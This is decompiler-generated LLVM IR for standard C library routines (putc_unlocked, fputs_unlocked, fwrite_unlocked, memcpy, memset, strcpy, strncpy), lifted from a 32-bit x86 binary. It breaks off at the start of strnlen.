define i32 @putc_unlocked(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_8051cf4 = load i32, i32* @esi, align 4
  %v0_8051cf5 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_8051cfd = sext i8 %arg1 to i32
  store i32 %v4_8051cfd, i32* @esi, align 4
  %v1_8051d01 = add i32 %arg2, 16
  %v2_8051d01 = inttoptr i32 %v1_8051d01 to i32*
  %v3_8051d01 = load i32, i32* %v2_8051d01, align 4
  store i32 %v3_8051d01, i32* %eax.global-to-local, align 4
  %v2_8051d04 = add i32 %arg2, 28
  %v3_8051d04 = inttoptr i32 %v2_8051d04 to i32*
  %v4_8051d04 = load i32, i32* %v3_8051d04, align 4
  %v10_8051d04 = icmp ult i32 %v3_8051d01, %v4_8051d04
  %v1_8051d07 = icmp eq i1 %v10_8051d04, false
  br i1 %v1_8051d07, label %dec_label_pc_8051d13, label %dec_label_pc_8051d09

dec_label_pc_8051d09:                             ; preds = %entry
  store i32 %v4_8051cfd, i32* %edx.global-to-local, align 4
  %v3_8051d0b = inttoptr i32 %v3_8051d01 to i8*
  store i8 %arg1, i8* %v3_8051d0b, align 1
  %v0_8051d0d = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d0d = add i32 %v0_8051d0d, 1
  store i32 %v1_8051d0d, i32* %eax.global-to-local, align 4
  %v1_8051d0e = load i32, i32* @ebx, align 4
  %v2_8051d0e = add i32 %v1_8051d0e, 16
  %v3_8051d0e = inttoptr i32 %v2_8051d0e to i32*
  store i32 %v1_8051d0d, i32* %v3_8051d0e, align 4
  %v0_8051d3e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051d3e

dec_label_pc_8051d13:                             ; preds = %entry
  %v1_8051d13 = inttoptr i32 %arg2 to i16*
  %v2_8051d13 = load i16, i16* %v1_8051d13, align 2
  %v3_8051d13 = zext i16 %v2_8051d13 to i32
  %v1_8051d16 = and i32 %v3_8051d13, 192
  store i32 %v1_8051d16, i32* %eax.global-to-local, align 4
  %v6_8051d1b = icmp eq i32 %v1_8051d16, 192
  br i1 %v6_8051d1b, label %dec_label_pc_8051d36, label %dec_label_pc_8051d22

dec_label_pc_8051d22:                             ; preds = %dec_label_pc_8051d13
  %v0_8051d22 = load i32, i32* @edx, align 4
  %v6_8051d2a = call i32 @__stdio_trans2w_o(i16* %v1_8051d13, i32 128, i32 %v0_8051d22, i32 %v0_8051d22)
  store i32 %v6_8051d2a, i32* %eax.global-to-local, align 4
  %v1_8051d32 = icmp eq i32 %v6_8051d2a, 0
  %v1_8051d34 = icmp eq i1 %v1_8051d32, false
  br i1 %v1_8051d34, label %dec_label_pc_8051da6, label %dec_label_pc_8051d22.dec_label_pc_8051d36_crit_edge

dec_label_pc_8051d22.dec_label_pc_8051d36_crit_edge: ; preds = %dec_label_pc_8051d22
  %v0_8051d36.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051d36

dec_label_pc_8051d36:                             ; preds = %dec_label_pc_8051d22.dec_label_pc_8051d36_crit_edge, %dec_label_pc_8051d13
  %v0_8051d99 = phi i32 [ %v0_8051d36.pre, %dec_label_pc_8051d22.dec_label_pc_8051d36_crit_edge ], [ %arg2, %dec_label_pc_8051d13 ]
  %v1_8051d36 = add i32 %v0_8051d99, 4
  %v2_8051d36 = inttoptr i32 %v1_8051d36 to i32*
  %v3_8051d36 = load i32, i32* %v2_8051d36, align 4
  %v13_8051d36 = icmp eq i32 %v3_8051d36, -2
  %v1_8051d3a = icmp eq i1 %v13_8051d36, false
  br i1 %v1_8051d3a, label %dec_label_pc_8051d43, label %dec_label_pc_8051d3c

dec_label_pc_8051d3c:                             ; preds = %dec_label_pc_8051d8b, %dec_label_pc_8051d76, %dec_label_pc_8051d71, %dec_label_pc_8051d60, %dec_label_pc_8051d36
  %v0_8051d3c = load i32, i32* @esi, align 4
  store i32 %v0_8051d3c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051d3e

dec_label_pc_8051d3e:                             ; preds = %dec_label_pc_8051d09, %dec_label_pc_8051d3c
  %v0_8051d3e = phi i32 [ %v0_8051d3e.pre, %dec_label_pc_8051d09 ], [ %v0_8051d3c, %dec_label_pc_8051d3c ]
  %v1_8051d3e = urem i32 %v0_8051d3e, 256
  br label %dec_label_pc_8051da9

dec_label_pc_8051d43:                             ; preds = %dec_label_pc_8051d36
  %v1_8051d43 = add i32 %v0_8051d99, 12
  %v2_8051d43 = inttoptr i32 %v1_8051d43 to i32*
  %v3_8051d43 = load i32, i32* %v2_8051d43, align 4
  store i32 %v3_8051d43, i32* %eax.global-to-local, align 4
  %v2_8051d46 = add i32 %v0_8051d99, 8
  %v3_8051d46 = inttoptr i32 %v2_8051d46 to i32*
  %v4_8051d46 = load i32, i32* %v3_8051d46, align 4
  %v15_8051d46 = icmp eq i32 %v3_8051d43, %v4_8051d46
  br i1 %v15_8051d46, label %dec_label_pc_8051d8b, label %dec_label_pc_8051d4b

dec_label_pc_8051d4b:                             ; preds = %dec_label_pc_8051d43
  %v2_8051d4b = add i32 %v0_8051d99, 16
  %v3_8051d4b = inttoptr i32 %v2_8051d4b to i32*
  %v4_8051d4b = load i32, i32* %v3_8051d4b, align 4
  %v15_8051d4b = icmp eq i32 %v3_8051d43, %v4_8051d4b
  %v1_8051d4e = icmp eq i1 %v15_8051d4b, false
  br i1 %v1_8051d4e, label %dec_label_pc_8051d60, label %dec_label_pc_8051d50

dec_label_pc_8051d50:                             ; preds = %dec_label_pc_8051d4b
  %v2_8051d54 = call i32 @__stdio_wcommit(i32 %v0_8051d99)
  store i32 %v2_8051d54, i32* %eax.global-to-local, align 4
  %v1_8051d5c = icmp eq i32 %v2_8051d54, 0
  %v1_8051d5e = icmp eq i1 %v1_8051d5c, false
  br i1 %v1_8051d5e, label %dec_label_pc_8051da6, label %dec_label_pc_8051d50.dec_label_pc_8051d60_crit_edge

dec_label_pc_8051d50.dec_label_pc_8051d60_crit_edge: ; preds = %dec_label_pc_8051d50
  %v0_8051d60.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051d60

dec_label_pc_8051d60:                             ; preds = %dec_label_pc_8051d50.dec_label_pc_8051d60_crit_edge, %dec_label_pc_8051d4b
  %v0_8051d60 = phi i32 [ %v0_8051d60.pre, %dec_label_pc_8051d50.dec_label_pc_8051d60_crit_edge ], [ %v0_8051d99, %dec_label_pc_8051d4b ]
  %v1_8051d60 = add i32 %v0_8051d60, 16
  %v2_8051d60 = inttoptr i32 %v1_8051d60 to i32*
  %v3_8051d60 = load i32, i32* %v2_8051d60, align 4
  store i32 %v3_8051d60, i32* %eax.global-to-local, align 4
  %v0_8051d63 = load i32, i32* @esi, align 4
  store i32 %v0_8051d63, i32* %edx.global-to-local, align 4
  %v1_8051d65 = trunc i32 %v0_8051d63 to i8
  %v3_8051d65 = inttoptr i32 %v3_8051d60 to i8*
  store i8 %v1_8051d65, i8* %v3_8051d65, align 1
  %v0_8051d67 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d67 = add i32 %v0_8051d67, 1
  store i32 %v1_8051d67, i32* %eax.global-to-local, align 4
  %v0_8051d68 = load i32, i32* @ebx, align 4
  %v1_8051d68 = add i32 %v0_8051d68, 1
  %v2_8051d68 = inttoptr i32 %v1_8051d68 to i8*
  %v3_8051d68 = load i8, i8* %v2_8051d68, align 1
  %v4_8051d68 = urem i8 %v3_8051d68, 2
  %v5_8051d68 = icmp eq i8 %v4_8051d68, 0
  %v2_8051d6c = add i32 %v0_8051d68, 16
  %v3_8051d6c = inttoptr i32 %v2_8051d6c to i32*
  store i32 %v1_8051d67, i32* %v3_8051d6c, align 4
  br i1 %v5_8051d68, label %dec_label_pc_8051d3c, label %dec_label_pc_8051d71

dec_label_pc_8051d71:                             ; preds = %dec_label_pc_8051d60
  %v0_8051d71 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051d71 = trunc i32 %v0_8051d71 to i8
  %v10_8051d71 = icmp eq i8 %v1_8051d71, 10
  %v1_8051d74 = icmp eq i1 %v10_8051d71, false
  br i1 %v1_8051d74, label %dec_label_pc_8051d3c, label %dec_label_pc_8051d76

dec_label_pc_8051d76:                             ; preds = %dec_label_pc_8051d71
  %v0_8051d79 = load i32, i32* @ebx, align 4
  %v2_8051d7a = call i32 @__stdio_wcommit(i32 %v0_8051d79)
  store i32 %v2_8051d7a, i32* %eax.global-to-local, align 4
  %v1_8051d82 = icmp eq i32 %v2_8051d7a, 0
  br i1 %v1_8051d82, label %dec_label_pc_8051d3c, label %dec_label_pc_8051d86

dec_label_pc_8051d86:                             ; preds = %dec_label_pc_8051d76
  %v0_8051d86 = load i32, i32* @ebx, align 4
  %v1_8051d86 = add i32 %v0_8051d86, 16
  %v2_8051d86 = inttoptr i32 %v1_8051d86 to i32*
  %v3_8051d86 = load i32, i32* %v2_8051d86, align 4
  %v4_8051d86 = add i32 %v3_8051d86, -1
  store i32 %v4_8051d86, i32* %v2_8051d86, align 4
  br label %dec_label_pc_8051da6

dec_label_pc_8051d8b:                             ; preds = %dec_label_pc_8051d43
  %v0_8051d8b = load i32, i32* @esi, align 4
  store i32 %v0_8051d8b, i32* @ecx, align 4
  %v6_8051d8d = trunc i32 %v0_8051d8b to i8
  store i8 %v6_8051d8d, i8* %stack_var_-9, align 1
  %v2_8051d94 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_8051d94, i32* %eax.global-to-local, align 4
  %v5_8051d99 = inttoptr i32 %v0_8051d99 to i16*
  %v6_8051d9a = call i32 @__stdio_WRITE(i16* %v5_8051d99, i32 %v2_8051d94, i32 1, i32 %v3_8051d43)
  store i32 %v6_8051d9a, i32* %eax.global-to-local, align 4
  %v1_8051da2 = icmp eq i32 %v6_8051d9a, 0
  %v1_8051da4 = icmp eq i1 %v1_8051da2, false
  br i1 %v1_8051da4, label %dec_label_pc_8051d3c, label %dec_label_pc_8051da6

dec_label_pc_8051da6:                             ; preds = %dec_label_pc_8051d8b, %dec_label_pc_8051d50, %dec_label_pc_8051d22, %dec_label_pc_8051d86
  br label %dec_label_pc_8051da9

dec_label_pc_8051da9:                             ; preds = %dec_label_pc_8051d3e, %dec_label_pc_8051da6
  %storemerge = phi i32 [ %v1_8051d3e, %dec_label_pc_8051d3e ], [ -1, %dec_label_pc_8051da6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8051cf5, i32* @ebx, align 4
  store i32 %v0_8051cf4, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8051d43, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8051d99, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %eax.global-to-local, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_8051da9, { 1, 0 }
  uselistorder label %dec_label_pc_8051da6, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8051d3e, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8051db0 = load i32, i32* @esi, align 4
  %v0_8051db1 = load i32, i32* @ebx, align 4
  store i32 %v0_8051db1, i32* %stack_var_-8, align 4
  %v4_8051db5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051db5, i32* @ebx, align 4
  %v3_8051dba = call i32 @strlen(i8* %arg1)
  store i32 %v3_8051dba, i32* @esi, align 4
  %v0_8051dcb = load i32, i32* @ebx, align 4
  %v6_8051dcc = call i32 @__GI_fwrite_unlocked(i32 %v0_8051dcb, i64 1, i32 %v3_8051dba, i32 %arg2)
  %v1_8051dd6 = load i32, i32* @esi, align 4
  %v12_8051dd6 = icmp eq i32 %v6_8051dcc, %v1_8051dd6
  %v3_8051dd8 = select i1 %v12_8051dd6, i32 %v6_8051dcc, i32 -1
  %v2_8051dde = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051dde, i32* @ebx, align 4
  store i32 %v0_8051db0, i32* @esi, align 4
  ret i32 %v3_8051dd8

; uselistorder directives
  uselistorder i32 %v6_8051dcc, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8051de4 = load i32, i32* @edi, align 4
  %v0_8051de5 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_8051deb = trunc i64 %arg2 to i32
  store i32 %v4_8051deb, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_8051df3 = inttoptr i32 %arg4 to i16*
  %v2_8051df3 = load i16, i16* %v1_8051df3, align 2
  %v1_8051df6 = and i16 %v2_8051df3, 192
  %v6_8051dfb = icmp eq i16 %v1_8051df6, 192
  br i1 %v6_8051dfb, label %dec_label_pc_8051e16, label %dec_label_pc_8051e02

dec_label_pc_8051e02:                             ; preds = %entry
  %v0_8051e02 = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_8051e0a = call i32 @__stdio_trans2w_o(i16* %v1_8051df3, i32 128, i32 %v0_8051e02, i32 %v0_8051e02)
  %v1_8051e12 = icmp eq i32 %v6_8051e0a, 0
  %v1_8051e14 = icmp eq i1 %v1_8051e12, false
  br i1 %v1_8051e14, label %dec_label_pc_8051e56, label %dec_label_pc_8051e16

dec_label_pc_8051e16:                             ; preds = %dec_label_pc_8051e02, %entry
  %v2_8051e16 = icmp eq i32 %v4_8051deb, 0
  br i1 %v2_8051e16, label %dec_label_pc_8051e56, label %dec_label_pc_8051e1a

dec_label_pc_8051e1a:                             ; preds = %dec_label_pc_8051e16
  %v1_8051e1a = icmp eq i32 %arg3, 0
  br i1 %v1_8051e1a, label %dec_label_pc_8051e56, label %dec_label_pc_8051e1e

dec_label_pc_8051e1e:                             ; preds = %dec_label_pc_8051e1a
  %v9_8051e23 = udiv i64 4294967295, %arg2
  %v10_8051e23 = trunc i64 %v9_8051e23 to i32
  %v6_8051e27 = icmp ult i32 %v10_8051e23, %arg3
  br i1 %v6_8051e27, label %dec_label_pc_8051e43, label %dec_label_pc_8051e29

dec_label_pc_8051e29:                             ; preds = %dec_label_pc_8051e1e
  %sext = mul i64 %arg2, 4294967296
  %v2_8051e2c = sdiv i64 %sext, 4294967296
  %v3_8051e2c = sext i32 %arg3 to i64
  %v4_8051e2c = mul nsw i64 %v3_8051e2c, %v2_8051e2c
  %v5_8051e2c = trunc i64 %v4_8051e2c to i32
  %v0_8051e2f = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_8051e35 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_8051e2c, i32 %v0_8051e2f, i32 %v10_8051e23)
  %v6_8051e35 = sext i32 %v5_8051e35 to i64
  %v10_8051e3f = udiv i64 %v6_8051e35, %arg2
  %v11_8051e3f = trunc i64 %v10_8051e3f to i32
  br label %dec_label_pc_8051e58

dec_label_pc_8051e43:                             ; preds = %dec_label_pc_8051e1e
  %v0_8051e43 = load i32, i32* @ebx, align 4
  %v1_8051e43 = inttoptr i32 %v0_8051e43 to i32*
  %v2_8051e43 = load i32, i32* %v1_8051e43, align 4
  %v1_8051e45 = or i32 %v2_8051e43, 8
  %v1_8051e48 = trunc i32 %v1_8051e45 to i16
  %v3_8051e48 = inttoptr i32 %v0_8051e43 to i16*
  store i16 %v1_8051e48, i16* %v3_8051e48, align 2
  %v0_8051e4b = load i32, i32* %stack_var_-28, align 4
  %v1_8051e4b = call i32 @__errno_location(i32 %v0_8051e4b)
  %v1_8051e50 = inttoptr i32 %v1_8051e4b to i32*
  store i32 22, i32* %v1_8051e50, align 4
  br label %dec_label_pc_8051e56

dec_label_pc_8051e56:                             ; preds = %dec_label_pc_8051e1a, %dec_label_pc_8051e16, %dec_label_pc_8051e02, %dec_label_pc_8051e43
  br label %dec_label_pc_8051e58

dec_label_pc_8051e58:                             ; preds = %dec_label_pc_8051e29, %dec_label_pc_8051e56
  %v0_8051e5b = phi i32 [ %v11_8051e3f, %dec_label_pc_8051e29 ], [ 0, %dec_label_pc_8051e56 ]
  store i32 %v0_8051de5, i32* @esi, align 4
  store i32 %v0_8051de4, i32* @edi, align 4
  ret i32 %v0_8051e5b

; uselistorder directives
  uselistorder i32 %v0_8051e02, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 0, 5, 4, 2, 1, 6, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051e58, { 1, 0 }
  uselistorder label %dec_label_pc_8051e56, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051e5d = load i32, i32* @esi, align 4
  store i32 %v0_8051e5d, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8051e5e = sdiv i32 %sext, 16777216
  store i32 %v4_8051e5e, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051e66 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051e66, i32* %edi.global-to-local, align 4
  %v2_8051e6c = udiv i32 %v4_8051e5e, 4
  %v3_8051e6f = inttoptr i32 %arg2 to i8*
  %v4_8051e6f = bitcast i16* %arg1 to i8*
  %v5_8051e6f = call i8* @_memcpy(i8* %v4_8051e6f, i8* %v3_8051e6f, i32 %v2_8051e6c)
  %v6_8051e6f = ptrtoint i8* %v5_8051e6f to i32
  store i32 %v6_8051e6f, i32* @ecx, align 4
  %v0_8051e71 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051e71 = and i32 %v0_8051e71, 2
  %v3_8051e71 = icmp eq i32 %v2_8051e71, 0
  br i1 %v3_8051e71, label %dec_label_pc_8051e77, label %dec_label_pc_8051e75

dec_label_pc_8051e75:                             ; preds = %entry
  %v0_8051e75 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051e75 = inttoptr i32 %v0_8051e75 to i16*
  %v2_8051e75 = load i16, i16* %v1_8051e75, align 2
  %v3_8051e75 = load i32, i32* %edi.global-to-local, align 4
  %v4_8051e75 = inttoptr i32 %v3_8051e75 to i16*
  store i16 %v2_8051e75, i16* %v4_8051e75, align 2
  %v5_8051e75 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051e75 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051e75 = load i1, i1* @df, align 1
  %v8_8051e75 = select i1 %v7_8051e75, i32 -2, i32 2
  %v9_8051e75 = add i32 %v8_8051e75, %v5_8051e75
  %v10_8051e75 = add i32 %v8_8051e75, %v6_8051e75
  store i32 %v9_8051e75, i32* %edi.global-to-local, align 4
  store i32 %v10_8051e75, i32* %esi.global-to-local, align 4
  %v0_8051e77.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051e77

dec_label_pc_8051e77:                             ; preds = %entry, %dec_label_pc_8051e75
  %v0_8051e77 = phi i32 [ %v0_8051e71, %entry ], [ %v0_8051e77.pre, %dec_label_pc_8051e75 ]
  %v2_8051e77 = urem i32 %v0_8051e77, 2
  %v3_8051e77 = icmp eq i32 %v2_8051e77, 0
  br i1 %v3_8051e77, label %dec_label_pc_8051e7c, label %dec_label_pc_8051e7b

dec_label_pc_8051e7b:                             ; preds = %dec_label_pc_8051e77
  %v0_8051e7b = load i32, i32* %esi.global-to-local, align 4
  %v1_8051e7b = inttoptr i32 %v0_8051e7b to i8*
  %v2_8051e7b = load i8, i8* %v1_8051e7b, align 1
  %v3_8051e7b = load i32, i32* %edi.global-to-local, align 4
  %v4_8051e7b = inttoptr i32 %v3_8051e7b to i8*
  store i8 %v2_8051e7b, i8* %v4_8051e7b, align 1
  %v5_8051e7b = load i32, i32* %edi.global-to-local, align 4
  %v6_8051e7b = load i32, i32* %esi.global-to-local, align 4
  %v7_8051e7b = load i1, i1* @df, align 1
  %v8_8051e7b = select i1 %v7_8051e7b, i32 -1, i32 1
  %v9_8051e7b = add i32 %v8_8051e7b, %v5_8051e7b
  %v10_8051e7b = add i32 %v8_8051e7b, %v6_8051e7b
  store i32 %v9_8051e7b, i32* %edi.global-to-local, align 4
  store i32 %v10_8051e7b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051e7c

dec_label_pc_8051e7c:                             ; preds = %dec_label_pc_8051e77, %dec_label_pc_8051e7b
  store i32 %v4_8051e66, i32* %eax.global-to-local, align 4
  %v2_8051e80 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051e80, i32* @esi, align 4
  ret i32 %v4_8051e66

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051e7c, { 1, 0 }
  uselistorder label %dec_label_pc_8051e77, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8051e84 = load i32, i32* @edi, align 4
  %v4_8051e8d = ptrtoint i8* %arg1 to i32
  %v5_8051e91 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8051e91 = ptrtoint i8* %v5_8051e91 to i32
  store i32 %v6_8051e91, i32* @ecx, align 4
  store i32 %v0_8051e84, i32* @edi, align 4
  ret i32 %v4_8051e8d

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051e9d = load i32, i32* @esi, align 4
  store i32 %v0_8051e9d, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051ea5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051ea5, i32* %edi.global-to-local, align 4
  %v4_8051ea9.pre = load i32, i32* @eax, align 4
  %v8_8051ea9.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8051ea9

dec_label_pc_8051ea9:                             ; preds = %dec_label_pc_8051ea9.dec_label_pc_8051ea9_crit_edge, %entry
  %v2_8051eaa = phi i32 [ %v7_8051eaa, %dec_label_pc_8051ea9.dec_label_pc_8051ea9_crit_edge ], [ %v4_8051ea5, %entry ]
  %v8_8051ea9 = phi i1 [ %v5_8051eaa, %dec_label_pc_8051ea9.dec_label_pc_8051ea9_crit_edge ], [ %v8_8051ea9.pre, %entry ]
  %v4_8051ea9 = phi i32 [ %v0_8051eab, %dec_label_pc_8051ea9.dec_label_pc_8051ea9_crit_edge ], [ %v4_8051ea9.pre, %entry ]
  %v7_8051ea9 = phi i32 [ %v0_8051ea9.pre, %dec_label_pc_8051ea9.dec_label_pc_8051ea9_crit_edge ], [ %arg2, %entry ]
  %v1_8051ea9 = inttoptr i32 %v7_8051ea9 to i8*
  %v2_8051ea9 = load i8, i8* %v1_8051ea9, align 1
  %v3_8051ea9 = zext i8 %v2_8051ea9 to i32
  %v5_8051ea9 = and i32 %v4_8051ea9, -256
  %v6_8051ea9 = or i32 %v3_8051ea9, %v5_8051ea9
  store i32 %v6_8051ea9, i32* %eax.global-to-local, align 4
  %v9_8051ea9 = select i1 %v8_8051ea9, i32 -1, i32 1
  %v10_8051ea9 = add i32 %v7_8051ea9, %v9_8051ea9
  store i32 %v10_8051ea9, i32* %esi.global-to-local, align 4
  %v3_8051eaa = inttoptr i32 %v2_8051eaa to i8*
  store i8 %v2_8051ea9, i8* %v3_8051eaa, align 1
  %v4_8051eaa = load i32, i32* %edi.global-to-local, align 4
  %v5_8051eaa = load i1, i1* @df, align 1
  %v6_8051eaa = select i1 %v5_8051eaa, i32 -1, i32 1
  %v7_8051eaa = add i32 %v6_8051eaa, %v4_8051eaa
  store i32 %v7_8051eaa, i32* %edi.global-to-local, align 4
  %v0_8051eab = load i32, i32* %eax.global-to-local, align 4
  %v3_8051eab = trunc i32 %v0_8051eab to i8
  %v4_8051eab = icmp eq i8 %v3_8051eab, 0
  %v1_8051ead = icmp eq i1 %v4_8051eab, false
  br i1 %v1_8051ead, label %dec_label_pc_8051ea9.dec_label_pc_8051ea9_crit_edge, label %dec_label_pc_8051eaf

dec_label_pc_8051ea9.dec_label_pc_8051ea9_crit_edge: ; preds = %dec_label_pc_8051ea9
  %v0_8051ea9.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051ea9

dec_label_pc_8051eaf:                             ; preds = %dec_label_pc_8051ea9
  store i32 %v4_8051ea5, i32* %eax.global-to-local, align 4
  %v2_8051eb3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051eb3, i32* @edx, align 4
  %v2_8051eb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051eb4, i32* @esi, align 4
  ret i32 %v4_8051ea5

; uselistorder directives
  uselistorder i32 %v0_8051eab, { 1, 0 }
  uselistorder i32 %v7_8051eaa, { 1, 0 }
  uselistorder i1 %v5_8051eaa, { 1, 0 }
  uselistorder i32 %v4_8051ea5, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051ecd = load i32, i32* @esi, align 4
  store i32 %v0_8051ecd, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051ed9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051ed9, i32* %edi.global-to-local, align 4
  %v1_8051edd = add i32 %arg3, 1
  br label %dec_label_pc_8051ede

dec_label_pc_8051ede:                             ; preds = %dec_label_pc_8051ee1, %entry
  %v3_8051ee2 = phi i32 [ %v4_8051ed9, %entry ], [ %v8_8051ee2, %dec_label_pc_8051ee1 ]
  %v0_8051ede = phi i32 [ %v1_8051edd, %entry ], [ %v0_8051ede.pre, %dec_label_pc_8051ee1 ]
  %v1_8051ede = add i32 %v0_8051ede, -1
  %v8_8051ede = icmp eq i32 %v1_8051ede, 0
  store i32 %v1_8051ede, i32* @ecx, align 4
  br i1 %v8_8051ede, label %.loopexit, label %dec_label_pc_8051ee1

dec_label_pc_8051ee1:                             ; preds = %dec_label_pc_8051ede
  %v0_8051ee1 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ee1 = inttoptr i32 %v0_8051ee1 to i8*
  %v2_8051ee1 = load i8, i8* %v1_8051ee1, align 1
  %v10_8051ee1 = load i1, i1* @df, align 1
  %v11_8051ee1 = select i1 %v10_8051ee1, i32 -1, i32 1
  %v12_8051ee1 = add i32 %v11_8051ee1, %v0_8051ee1
  store i32 %v12_8051ee1, i32* %esi.global-to-local, align 4
  %v4_8051ee2 = inttoptr i32 %v3_8051ee2 to i8*
  store i8 %v2_8051ee1, i8* %v4_8051ee2, align 1
  %v5_8051ee2 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051ee2 = load i1, i1* @df, align 1
  %v7_8051ee2 = select i1 %v6_8051ee2, i32 -1, i32 1
  %v8_8051ee2 = add i32 %v7_8051ee2, %v5_8051ee2
  store i32 %v8_8051ee2, i32* %edi.global-to-local, align 4
  %v6_8051ee3 = icmp eq i8 %v2_8051ee1, 0
  %v1_8051ee5 = icmp eq i1 %v6_8051ee3, false
  %v0_8051ede.pre = load i32, i32* @ecx, align 4
  br i1 %v1_8051ee5, label %dec_label_pc_8051ede, label %dec_label_pc_8051ee7

dec_label_pc_8051ee7:                             ; preds = %dec_label_pc_8051ee1
  %v1_8051ee7 = add i32 %v0_8051ede.pre, -1
  %v2_8051ee8 = sext i8 %v2_8051ee1 to i32
  %v4_8051ee8 = inttoptr i32 %v8_8051ee2 to i8*
  %v5_8051ee8 = call i8* @_memset(i8* %v4_8051ee8, i32 %v2_8051ee8, i32 %v1_8051ee7)
  %v6_8051ee8 = ptrtoint i8* %v5_8051ee8 to i32
  store i32 %v6_8051ee8, i32* @ecx, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_8051ede, %dec_label_pc_8051ee7
  %v2_8051eee = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051eee, i32* @edx, align 4
  %v2_8051eef = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051eef, i32* @esi, align 4
  ret i32 %v4_8051ed9

; uselistorder directives
  uselistorder i32 %v8_8051ee2, { 0, 2, 1 }
  uselistorder i8 %v2_8051ee1, { 0, 2, 1 }
  uselistorder i32 %v1_8051ede, { 1, 0 }
  uselistorder i32 %v4_8051ed9, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_1()
